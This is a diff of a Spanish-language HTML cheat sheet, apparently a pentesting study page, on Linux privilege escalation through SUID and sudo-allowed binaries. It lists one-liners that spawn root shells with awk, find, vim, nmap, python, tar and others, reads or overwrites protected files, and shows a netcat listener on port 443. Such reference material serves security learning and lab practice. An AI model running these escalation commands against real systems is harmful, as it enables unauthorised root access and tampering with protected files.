@@ -240,182 +240,133 @@
     <!-- --------------------------------------------------------------------- -->
     <section class="content">
 <br>
-<h2>BINARIOS SUID</h2>
-        <div style="max-width: 700px; margin: 0 auto 60px auto;">
-            <p><a href="#introduccion" class="footer-link">1. Introducción</a></p>
-            <p><a href="#conceptos" class="footer-link">2. Conceptos Teóricos</a></p>
-            <p><a href="#herramientas" class="footer-link">3. Herramientas Utilizadas</a></p>
-            <p><a href="#laboratorio" class="footer-link">4. Práctica y Laboratorio</a></p>
-            <p><a href="#cheatsheet" class="footer-link">5. Cheatsheet de Comandos</a></p>
-            <p><a href="#pasos" class="footer-link">6. Pasos Detallados</a></p>
-            <p><a href="#referencias" class="footer-link">7. Referencias y Recursos</a></p>
-        </div>
+<h3>🔎 BUSCAR BINARIOS SUID EN EL SISTEMA</h3>
+<p>Buscar BINARIOS CON EL BIT SUID activado desde la raíz:</p>
+<pre><code>find / -perm -4000 2>/dev/null
+find / -perm -u=s 2>/dev/null</code></pre>
 
-<h2>UNIX SUID BINARIES</h2>
+<p>Mostrar las entradas de sudoers aplicables al usuario actual:</p>
+<pre><code>sudo -l</code></pre>
+<p><em>Ejemplo de salida:</em></p>
+<pre><code>User Mayuso may run the following commands on this host:
+    (root) NOPASSWD: /usr/bin/cat
+    (root) /usr/bin/vim
+    (ALL) /usr/sbin/service</code></pre>
 
-<div class="card">
-    <h3>🔎 BUSCAR BINARIOS SUID EN EL SISTEMA</h3>
-    <pre><code>find / -perm -4000 2>/dev/null
-find / -perm -u=s 2>/dev/null
+<pre><code>cat /etc/sudoers</code></pre>
 
-sudo -l
-
-cat /etc/sudoers
-
-# Linux Capabilities
-getcap -r / 2>/dev/null
+<p>Buscar Linux Capabilities:</p>
+<pre><code>getcap -r / 2>/dev/null
 /usr/bin/getcap -r / 2>/dev/null
 /usr/sbin/getcap -r / 2>/dev/null</code></pre>
-</div>
 
-<div class="card">
-    <h3>🏷️ DEFINIR VARIABLE LFILE</h3>
-    <pre><code>export LFILE=/root/nota.txt</code></pre>
-    <p>Ejemplo de uso:</p>
-    <pre><code>cat "$LFILE"</code></pre>
-</div>
+<hr>
 
-<!-- ==================== BINARIOS ==================== -->
+<h3>🏷️ DEFINIR VARIABLES</h3>
+<pre><code>export saludo=Hello
+echo $saludo</code></pre>
 
-<div class="card">
-    <h3>🅱️ AWK</h3>
-    <pre><code># Shell
-awk 'BEGIN {system("/bin/sh")}'
+<pre><code>export LFILE=/root/nota.txt
+sudo cat "$LFILE"</code></pre>
 
-# Lectura
-LFILE=/root/secret.txt
-awk '//' "$LFILE"
+<hr>
 
-# Escritura
-LFILE=/root/secret.txt
+<h3>🅱️ BINARIO: AWK</h3>
+<pre><code>awk 'BEGIN {system("/bin/sh")}'</code></pre>
+<pre><code>LFILE=[archivo_para_leer]
+awk '//' "$LFILE"</code></pre>
+<pre><code>LFILE=[archivo_para_escribir]
 awk -v LFILE=$LFILE 'BEGIN { print "DATA" > LFILE }'</code></pre>
-</div>
+<pre><code>sudo awk 'BEGIN {system("/bin/sh")}'</code></pre>
 
-<div class="card">
-    <h3>🅱️ CAT</h3>
-    <pre><code>LFILE=/root/secret.txt
+<h3>🅱️ BINARIO: CAT</h3>
+<pre><code>LFILE=[archivo_para_leer]
 cat "$LFILE"
 
-# Con sudo
 sudo cat "$LFILE"</code></pre>
-</div>
 
-<div class="card">
-    <h3>🅱️ CP</h3>
-    <pre><code># Lectura
-LFILE=/root/secret.txt
-cp "$LFILE" /dev/stdout
-
-# Escritura
+<h3>🅱️ BINARIO: CP</h3>
+<pre><code>LFILE=[archivo_para_leer]
+cp "$LFILE" /dev/stdout</code></pre>
+<pre><code>LFILE=[archivo_para_escribir]
 echo "DATA" | cp /dev/stdin "$LFILE"</code></pre>
-</div>
+<pre><code>sudo cp /bin/sh /bin/cp</code></pre>
 
-<div class="card">
-    <h3>🅱️ CUT</h3>
-    <pre><code>LFILE=/root/secret.txt
+<h3>🅱️ BINARIO: CUT</h3>
+<pre><code>LFILE=[archivo_para_leer]
 cut -d "" -f1 "$LFILE"</code></pre>
-</div>
 
-<div class="card">
-    <h3>🅱️ DD</h3>
-    <pre><code>LFILE=/root/secret.txt
+<h3>🅱️ BINARIO: DD</h3>
+<pre><code>LFILE=[archivo_para_leer]
 dd if=$LFILE</code></pre>
-</div>
 
-<div class="card">
-    <h3>🅱️ ENV</h3>
-    <pre><code>env /bin/sh</code></pre>
-</div>
+<h3>🅱️ BINARIO: ENV</h3>
+<pre><code>env /bin/sh</code></pre>
 
-<div class="card">
-    <h3>🅱️ FIND</h3>
-    <pre><code>find . -exec /bin/sh \; -quit</code></pre>
-</div>
+<h3>🅱️ BINARIO: FIND</h3>
+<pre><code>find . -exec /bin/sh \; -quit</code></pre>
 
-<div class="card">
-    <h3>🅱️ GREP</h3>
-    <pre><code>LFILE=/root/secret.txt
-grep '' "$LFILE"</code></pre>
-</div>
+<h3>🅱️ BINARIO: GREP</h3>
+<pre><code>LFILE=[archivo_para_leer]
+grep '' $LFILE</code></pre>
 
-<div class="card">
-    <h3>🅱️ LESS</h3>
-    <pre><code>less /etc/profile
+<h3>🅱️ BINARIO: LESS</h3>
+<pre><code>less /etc/profile
 !/bin/sh</code></pre>
-</div>
 
-<div class="card">
-    <h3>🅱️ MORE</h3>
-    <pre><code>TERM= more /etc/profile
+<h3>🅱️ BINARIO: MORE</h3>
+<pre><code>TERM= more /etc/profile
 !/bin/sh</code></pre>
-</div>
 
-<div class="card">
-    <h3>🅱️ NANO</h3>
-    <pre><code>nano
+<h3>🅱️ BINARIO: MV</h3>
+<pre><code>LFILE=[archivo_para_escribir]
+TF=$(mktemp)
+echo "DATA" > $TF
+sudo mv $TF $LFILE</code></pre>
+
+<h3>🅱️ BINARIO: NANO</h3>
+<pre><code>nano
 ^R^X
 reset; sh 1>&0 2>&0</code></pre>
-</div>
 
-<div class="card">
-    <h3>🅱️ NMAP</h3>
-    <pre><code>TF=$(mktemp)
+<h3>🅱️ BINARIO: NMAP</h3>
+<pre><code>TF=$(mktemp)
 echo 'os.execute("/bin/sh")' > $TF
 sudo nmap --script=$TF</code></pre>
-</div>
 
-<div class="card">
-    <h3>🅱️ PERL</h3>
-    <pre><code>perl -e 'exec "/bin/sh";'</code></pre>
-</div>
+<h3>🅱️ BINARIO: PERL</h3>
+<pre><code>perl -e 'exec "/bin/sh";'</code></pre>
 
-<div class="card">
-    <h3>🅱️ PYTHON</h3>
-    <pre><code>python -c 'import os; os.system("/bin/sh")'</code></pre>
-</div>
+<h3>🅱️ BINARIO: PYTHON</h3>
+<pre><code>python -c 'import os; os.system("/bin/sh")'</code></pre>
 
-<div class="card">
-    <h3>🅱️ RUBY</h3>
-    <pre><code>ruby -e 'exec "/bin/sh"'</code></pre>
-</div>
+<h3>🅱️ BINARIO: RUBY</h3>
+<pre><code>ruby -e 'exec "/bin/sh"'</code></pre>
 
-<div class="card">
-    <h3>🅱️ SED</h3>
-    <pre><code>sed -n '1e exec sh 1>&0' /etc/hosts</code></pre>
-</div>
+<h3>🅱️ BINARIO: SED</h3>
+<pre><code>sed -n '1e exec sh 1>&0' /etc/hosts</code></pre>
 
-<div class="card">
-    <h3>🅱️ TAR</h3>
-    <pre><code>tar -cf /dev/null /dev/null --checkpoint=1 --checkpoint-action=exec=/bin/sh</code></pre>
-</div>
+<h3>🅱️ BINARIO: TAR</h3>
+<pre><code>tar -cf /dev/null /dev/null --checkpoint=1 --checkpoint-action=exec=/bin/sh</code></pre>
 
-<div class="card">
-    <h3>🅱️ VI / VIM</h3>
-    <pre><code>vi -c ':!/bin/sh' /dev/null
-# o
-vim -c ':!/bin/sh'</code></pre>
-</div>
+<h3>🅱️ BINARIO: VI / VIM</h3>
+<pre><code>vim -c ':!/bin/sh'</code></pre>
 
-<!-- ==================== SECCIONES FINALES ==================== -->
+<hr>
 
-<div class="card">
-    <h3>🐱 ESCUCHAR CON NETCAT</h3>
-    <pre><code>sudo nc -nlvp 443</code></pre>
-</div>
+<h3>🐱 ESCUCHAR CON NETCAT</h3>
+<pre><code>sudo nc -nlvp 443</code></pre>
 
-<div class="card">
-    <h3>🈂️ TRATAMIENTO DE LA TTY</h3>
-    <pre><code>python3 -c 'import pty; pty.spawn("/bin/bash")'
+<h3>🈂️ TRATAMIENTO DE LA TTY</h3>
+<pre><code>python3 -c 'import pty; pty.spawn("/bin/bash")'
 
 script /dev/null -c bash
 stty raw -echo; fg
 reset xterm
 export TERM=xterm</code></pre>
-</div>
 
-<div class="card">
-    <h3>👑 ESCALAR PRIVILEGIOS (Resumen)</h3>
-    <pre><code>sudo /bin/bash -l
+<h3>👑 ESCALAR PRIVILEGIOS (Resumen)</h3>
+<pre><code>sudo /bin/bash -l
 sudo awk 'BEGIN {system("/bin/sh")}'
 sudo env /bin/sh
 sudo find . -exec /bin/sh \; -quit
@@ -423,10 +374,9 @@ sudo nmap --script=$TF
 sudo perl -e 'exec "/bin/sh";'
 sudo python -c 'import os; os.system("/bin/sh")'
 sudo vim -c ':!/bin/sh'</code></pre>
-</div>
 
-<p style="text-align:center; margin-top:50px; opacity:0.6;">
-    Página en construcción • Más binarios y técnicas se irán añadiendo
+<p style="text-align:center; margin-top:40px; opacity:0.7;">
+    Más binarios y técnicas se irán añadiendo progresivamente
 </p>
 
     </section>
